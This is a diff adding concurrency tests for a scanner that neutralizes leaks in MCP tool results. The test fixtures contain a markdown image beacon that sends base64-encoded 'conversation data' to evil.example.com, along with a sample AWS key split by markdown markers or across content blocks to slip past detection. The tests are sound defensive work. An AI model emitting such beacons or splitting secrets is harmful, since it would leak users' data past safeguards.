@@ -79,5 +79,68 @@ async def test_benign_concurrent_scans_unchanged():
     assert all((not blocked) and intact for blocked, intact in out)
 
 
+# ── CHG-0101: extend the concurrency-safety proof to the render-leak neutralization
+# (CHG-0096/0097/0099 — exfil beacons + markdown-split/encoded PII) and the cross-block
+# split-secret block (CHG-0100). These run in the hot scan path via stateless neutralizers
+# (compiled regexes are read-only) + pure detection, but a future edit could introduce
+# shared mutable state or a torn/interleaved neutralization under load — this backstops it.
+import base64 as _base64  # noqa: E402
+import re as _re  # noqa: E402
+
+
+def _rendered(x: str) -> str:
+    return x.replace("**", "").replace("`", "")
+
+
+async def _scan_render_leak(i: int):
+    marker = f"MARKER{i:04d}ZZZ"  # unique BENIGN token — must survive + not cross-contaminate
+    payload = _base64.b64encode(f"exfil conversation data for call {i} padding".encode()).decode()
+    text = (f"[{marker}] see ![x](https://evil.example.com/?d={payload}) "
+            f"and key AKIA**IOSFODNN7**EXAMPLE done")
+    scanned, blocked, tags, findings, meta = await mcp_proxy._scan_tool_result_floor(
+        {"content": [{"type": "text", "text": text}]},
+        tool_name="fetch", enabled_info=None, org_slug=f"org{i % 10}", server_slug="s", actor=None)
+    return i, marker, json.dumps(scanned)
+
+
+@pytest.mark.asyncio
+async def test_concurrent_render_leak_neutralization_no_cross_contamination():
+    results = await asyncio.gather(*[_scan_render_leak(i) for i in range(_N)])
+    beacon_live, md_leak, marker_missing, cross = [], [], [], []
+    for i, marker, blob in results:
+        if marker not in blob:                                    # benign token must survive
+            marker_missing.append(i)
+        if _re.search(r'!\[[^\]]*\]\(\s*https?://[^)]*evil', blob):  # beacon must be defanged
+            beacon_live.append(i)
+        if "AKIAIOSFODNN7EXAMPLE" in _rendered(blob):             # markdown-split must not reconstruct
+            md_leak.append(i)
+        for j in range(_N):
+            if j != i and f"MARKER{j:04d}ZZZ" in blob:
+                cross.append((i, j))
+                break
+    assert not marker_missing, f"benign token lost under concurrency: {marker_missing[:10]}"
+    assert not beacon_live, f"exfil beacon survived under concurrency: {beacon_live[:10]}"
+    assert not md_leak, f"markdown-split secret reconstructed under concurrency: {md_leak[:10]}"
+    assert not cross, f"cross-contamination between concurrent neutralizations: {cross[:10]}"
+
+
+async def _scan_split(i: int):
+    sec = "AKIAIOSFODNN7EXAMPLE"  # valid aws_access_key, split across two content blocks
+    scanned, blocked, tags, findings, meta = await mcp_proxy._scan_tool_result_floor(
+        {"content": [{"type": "text", "text": "key " + sec[:10]},
+                     {"type": "text", "text": sec[10:] + f" call{i}"}]},
+        tool_name="fetch", enabled_info=None, org_slug=f"org{i % 10}", server_slug="s", actor=None)
+    return i, blocked, meta.get("cross_block_split_secret")
+
+
+@pytest.mark.asyncio
+async def test_concurrent_cross_block_split_all_blocked():
+    results = await asyncio.gather(*[_scan_split(i) for i in range(_N)])
+    not_blocked = [i for i, blocked, _cs in results if not blocked]
+    missing_meta = [i for i, _b, cs in results if not cs]
+    assert not not_blocked, f"cross-block split secret NOT blocked under concurrency: {not_blocked[:10]}"
+    assert not missing_meta, f"split-block meta missing under concurrency: {missing_meta[:10]}"
+
+
 if __name__ == "__main__":
     raise SystemExit(pytest.main([__file__, "-q"]))
